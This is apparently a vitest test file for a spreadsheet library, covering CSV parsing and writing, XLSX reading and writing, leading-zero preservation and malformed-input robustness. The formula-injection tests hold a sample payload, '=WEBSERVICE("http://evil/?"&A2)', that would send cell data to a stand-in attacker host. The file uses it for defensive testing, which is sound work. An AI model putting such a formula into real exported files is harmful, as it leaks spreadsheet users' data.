/**
 * Spreadsheets.
 *
 * The failure modes here are quiet and expensive: a delimiter guessed wrong
 * shreds every row, a shared-string table ignored turns text into numbers, and
 * a leading zero stripped off turns a postcode or an account number into
 * something else entirely. All three are checked.
 */

import { describe, expect, it } from 'vitest';
import {
  columnName,
  columnOf,
  isNumeric,
  parseCsv,
  parseSharedStrings,
  readXlsx,
  sheetName,
  sniffDelimiter,
  writeCsv,
  writeXlsx,
} from '../src/client/sheet';
import { entry, unzip } from '../src/client/zip';

describe('sniffDelimiter', () => {
  it('finds commas', () => {
    expect(sniffDelimiter('a,b,c\n1,2,3')).toBe(',');
  });

  it('finds semicolons, which half of Europe exports', () => {
    expect(sniffDelimiter('a;b;c\n1;2;3')).toBe(';');
  });

  it('finds tabs', () => {
    expect(sniffDelimiter('a\tb\tc\n1\t2\t3')).toBe('\t');
  });

  it('is not fooled by commas inside quoted prose', () => {
    const text = 'name;note\nAda;"a long, rambling, comma-filled note"\nBob;"another, one, here"';
    expect(sniffDelimiter(text)).toBe(';');
  });

  it('falls back to a comma when there is nothing to go on', () => {
    expect(sniffDelimiter('single-column\nvalue')).toBe(',');
  });
});

describe('parseCsv', () => {
  it('reads plain rows', () => {
    expect(parseCsv('a,b\n1,2')).toEqual([['a', 'b'], ['1', '2']]);
  });

  it('keeps a comma inside a quoted field', () => {
    expect(parseCsv('name,note\nAda,"Lovelace, Ada"')).toEqual([
      ['name', 'note'],
      ['Ada', 'Lovelace, Ada'],
    ]);
  });

  it('handles a doubled quote as one literal quote', () => {
    expect(parseCsv('a\n"she said ""hello"""')).toEqual([['a'], ['she said "hello"']]);
  });

  it('keeps a newline inside a quoted field', () => {
    expect(parseCsv('a,b\n"line one\nline two",x')).toEqual([
      ['a', 'b'],
      ['line one\nline two', 'x'],
    ]);
  });

  it('survives Windows line endings', () => {
    expect(parseCsv('a,b\r\n1,2\r\n')).toEqual([['a', 'b'], ['1', '2']]);
  });

  it('strips a byte-order mark rather than gluing it to the first header', () => {
    expect(parseCsv('﻿name,age\nAda,36')[0]).toEqual(['name', 'age']);
  });

  it('does not invent a trailing empty row', () => {
    expect(parseCsv('a,b\n1,2\n\n')).toHaveLength(2);
  });

  it('keeps empty fields in the middle', () => {
    expect(parseCsv('a,,c')).toEqual([['a', '', 'c']]);
  });
});

describe('writeCsv', () => {
  it('quotes only what needs quoting', () => {
    expect(writeCsv([['plain', 'has,comma', 'has"quote']])).toBe('plain,"has,comma","has""quote"');
  });

  it('round-trips anything the reader can read', () => {
    const rows = [['name', 'note'], ['Ada', 'Lovelace, "the" first\nsecond line'], ['', 'x']];
    expect(parseCsv(writeCsv(rows))).toEqual(rows);
  });
});

describe('column references', () => {
  it('reads A1-style references', () => {
    expect(columnOf('A1')).toBe(0);
    expect(columnOf('Z9')).toBe(25);
    expect(columnOf('AA1')).toBe(26);
    expect(columnOf('BC12')).toBe(54);
  });

  it('writes them back', () => {
    expect(columnName(0)).toBe('A');
    expect(columnName(25)).toBe('Z');
    expect(columnName(26)).toBe('AA');
    expect(columnName(54)).toBe('BC');
  });

  it('round-trips across the awkward boundaries', () => {
    for (const i of [0, 25, 26, 51, 52, 701, 702]) expect(columnOf(columnName(i) + '1')).toBe(i);
  });
});

describe('isNumeric', () => {
  it('accepts real numbers', () => {
    for (const v of ['0', '42', '-3.5', '+7', '1e6', '.5']) expect(isNumeric(v), v).toBe(true);
  });

  it('refuses to turn an identifier with a leading zero into a number', () => {
    // "007" becoming 7 is the classic way a spreadsheet destroys a postcode,
    // a phone number or an account reference.
    expect(isNumeric('007')).toBe(false);
    expect(isNumeric('01234 567890')).toBe(false);
  });

  it('refuses anything that is not purely a number', () => {
    for (const v of ['', '12a', '1,000', '£5', '2024-01-01', ' 5', '5 ']) expect(isNumeric(v), v).toBe(false);
  });
});

describe('parseSharedStrings', () => {
  it('reads the table cells index into', () => {
    expect(parseSharedStrings('<sst><si><t>Alpha</t></si><si><t>Beta</t></si></sst>')).toEqual(['Alpha', 'Beta']);
  });

  it('joins a string split into differently formatted runs', () => {
    // Bolding half a cell splits it into runs; naive readers lose the rest.
    expect(parseSharedStrings('<sst><si><r><t>Hello </t></r><r><t>world</t></r></si></sst>')).toEqual(['Hello world']);
  });

  it('decodes entities', () => {
    expect(parseSharedStrings('<sst><si><t>R&amp;D &lt;x&gt;</t></si></sst>')).toEqual(['R&D <x>']);
  });
});

describe('writeXlsx / readXlsx', () => {
  const book = {
    sheets: [
      { name: 'People', rows: [['Name', 'Age', 'Code'], ['Ada Lovelace', '36', '007'], ['Bob', '', 'X1']] },
      { name: 'Notes', rows: [['A "quoted" note, with comma']] },
    ],
  };

  it('writes a ZIP with the parts Excel requires', async () => {
    const parts = await unzip(await writeXlsx(book));
    const names = parts.map((p) => p.name);
    for (const required of ['[Content_Types].xml', '_rels/.rels', 'xl/workbook.xml', 'xl/worksheets/sheet1.xml']) {
      expect(names, `missing ${required}`).toContain(required);
    }
  });

  it('declares a content type for every worksheet it ships', async () => {
    const parts = await unzip(await writeXlsx(book));
    const types = new TextDecoder().decode(entry(parts, '[Content_Types].xml')!);
    for (const part of parts.filter((p) => p.name.startsWith('xl/worksheets/'))) {
      expect(types, `${part.name} has no content type`).toContain(`PartName="/${part.name}"`);
    }
  });

  it('round-trips every sheet, name and cell', async () => {
    const back = await readXlsx(await writeXlsx(book));
    expect(back.sheets.map((s) => s.name)).toEqual(['People', 'Notes']);
    expect(back.sheets[0]!.rows[1]).toEqual(['Ada Lovelace', '36', '007']);
    expect(back.sheets[1]!.rows[0]).toEqual(['A "quoted" note, with comma']);
  });

  it('keeps a leading zero through the round trip', async () => {
    const back = await readXlsx(await writeXlsx(book));
    expect(back.sheets[0]!.rows[1]![2]).toBe('007');
  });

  it('keeps an empty cell in the middle of a row', async () => {
    const back = await readXlsx(await writeXlsx(book));
    expect(back.sheets[0]!.rows[2]).toEqual(['Bob', '', 'X1']);
  });

  it('reads a workbook whose sheets are stored out of order', async () => {
    // sheet1.xml is not necessarily the first sheet; the relationship says which.
    const enc = (s: string) => new TextEncoder().encode(s);
    const { zip } = await import('../src/client/zip');
    const made = await zip([
      { name: 'xl/workbook.xml', data: enc('<workbook xmlns:r="r"><sheets><sheet name="Second" r:id="rB"/><sheet name="First" r:id="rA"/></sheets></workbook>') },
      { name: 'xl/_rels/workbook.xml.rels', data: enc('<Relationships><Relationship Id="rA" Target="worksheets/sheetA.xml"/><Relationship Id="rB" Target="worksheets/sheetB.xml"/></Relationships>') },
      { name: 'xl/worksheets/sheetA.xml', data: enc('<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>alpha</t></is></c></row></sheetData></worksheet>') },
      { name: 'xl/worksheets/sheetB.xml', data: enc('<worksheet><sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>beta</t></is></c></row></sheetData></worksheet>') },
    ]);
    const back = await readXlsx(made);
    expect(back.sheets.map((s) => s.name)).toEqual(['Second', 'First']);
    expect(back.sheets[0]!.rows[0]).toEqual(['beta']);
    expect(back.sheets[1]!.rows[0]).toEqual(['alpha']);
  });

  it('resolves shared strings rather than reporting their index', async () => {
    const enc = (s: string) => new TextEncoder().encode(s);
    const { zip } = await import('../src/client/zip');
    const made = await zip([
      { name: 'xl/workbook.xml', data: enc('<workbook><sheets><sheet name="S"/></sheets></workbook>') },
      { name: 'xl/sharedStrings.xml', data: enc('<sst><si><t>zero</t></si><si><t>one</t></si></sst>') },
      { name: 'xl/worksheets/sheet1.xml', data: enc('<worksheet><sheetData><row r="1"><c r="A1" t="s"><v>1</v></c><c r="B1"><v>42</v></c></row></sheetData></worksheet>') },
    ]);
    const back = await readXlsx(made);
    expect(back.sheets[0]!.rows[0]).toEqual(['one', '42']);
  });

  it('places cells by their reference, so a gap stays a gap', async () => {
    const enc = (s: string) => new TextEncoder().encode(s);
    const { zip } = await import('../src/client/zip');
    const made = await zip([
      { name: 'xl/workbook.xml', data: enc('<workbook><sheets><sheet name="S"/></sheets></workbook>') },
      { name: 'xl/worksheets/sheet1.xml', data: enc('<worksheet><sheetData><row r="1"><c r="A1"><v>1</v></c><c r="D1"><v>4</v></c></row></sheetData></worksheet>') },
    ]);
    expect((await readXlsx(made)).sheets[0]!.rows[0]).toEqual(['1', '', '', '4']);
  });

  it('refuses a ZIP that is not a spreadsheet', async () => {
    const { zip } = await import('../src/client/zip');
    const notSheet = await zip([{ name: 'hello.txt', data: new TextEncoder().encode('hi') }]);
    await expect(readXlsx(notSheet)).rejects.toThrow(/not a spreadsheet/i);
  });
});

describe('CSV formula-injection safety', () => {
  it('neutralises a leading = or @ so the value stays text when reopened', () => {
    expect(writeCsv([['=WEBSERVICE("http://evil/?"&A2)']])).toBe(`"'=WEBSERVICE(""http://evil/?""&A2)"`);
    expect(writeCsv([['@SUM(A1:A9)']])).toBe(`'@SUM(A1:A9)`);
  });

  it('never touches ordinary negative numbers, which lead with -', () => {
    // The reason + and - are deliberately not neutralised: a number never
    // begins with = or @, but -5 is an everyday value and prefixing it would
    // corrupt it into text.
    expect(writeCsv([['-5', '+3.2', '3.14']])).toBe('-5,+3.2,3.14');
  });
});

describe('writeXlsx sheet names', () => {
  it('truncates before escaping, so an entity is never cut in half', () => {
    const long = 'a'.repeat(30) + '&b';
    // 30 a's + '&' + 'b' -> slice(0,31) keeps the raw '&', then escapeXml makes
    // it &amp;. The old order escaped first and sliced through '&amp;'.
    expect(sheetName(long)).toBe('a'.repeat(30) + '&');
  });

  it('strips characters Excel forbids and never yields an empty name', () => {
    expect(sheetName('a/b:c*?[]')).not.toMatch(/[/:*?[\]]/);
    expect(sheetName('')).toBe('Sheet');
    expect(sheetName('   ')).toBe('Sheet');
  });

  it('produces a workbook whose sheet name is well-formed XML', async () => {
    const xlsx = await writeXlsx({ sheets: [{ name: 'a'.repeat(30) + '&b.csv', rows: [['x']] }] });
    const parts = await unzip(xlsx);
    const workbook = new TextDecoder().decode(entry(parts, 'xl/workbook.xml')!);
    // No bare ampersand: every & is the start of an entity.
    expect(workbook.match(/&(?!amp;|lt;|gt;|quot;|apos;|#)/)).toBeNull();
    // And it round-trips back through the reader.
    const back = await readXlsx(xlsx);
    expect(back.sheets[0]!.rows[0]![0]).toBe('x');
  });
});

describe('malformed xlsx does not crash the reader', () => {
  it('reads a huge numeric character reference as literal text instead of throwing', () => {
    expect(parseSharedStrings('<sst><si><t>hi&#xFFFFFFFF;</t></si></sst>')).toEqual(['hi&#xFFFFFFFF;']);
    expect(parseSharedStrings('<sst><si><t>x&#9999999999;y</t></si></sst>')).toEqual(['x&#9999999999;y']);
  });

  it('still decodes valid references', () => {
    expect(parseSharedStrings('<sst><si><t>A&amp;B&#65;&#x42;</t></si></sst>')).toEqual(['A&BAB']);
  });

  it('ignores a row/cell reference beyond the real grid rather than allocating billions', async () => {
    const enc = (s: string) => new TextEncoder().encode(s);
    const { zip } = await import('../src/client/zip');
    const made = await zip([
      { name: 'xl/workbook.xml', data: enc('<workbook xmlns:r="r"><sheets><sheet name="S" r:id="rA"/></sheets></workbook>') },
      { name: 'xl/_rels/workbook.xml.rels', data: enc('<Relationships><Relationship Id="rA" Target="worksheets/sheetA.xml"/></Relationships>') },
      { name: 'xl/worksheets/sheetA.xml', data: enc(
        '<worksheet><sheetData>' +
        '<row r="1073741824"><c r="A1073741824" t="inlineStr"><is><t>far</t></is></c></row>' +
        '<row r="1"><c r="A1" t="inlineStr"><is><t>ok</t></is></c></row>' +
        '</sheetData></worksheet>') },
    ]);
    const start = performance.now();
    const back = await readXlsx(made);
    // The out-of-grid row is dropped; the real row survives; and it did not OOM.
    expect(back.sheets[0]!.rows[0]).toEqual(['ok']);
    expect(performance.now() - start).toBeLessThan(500);
  });
});
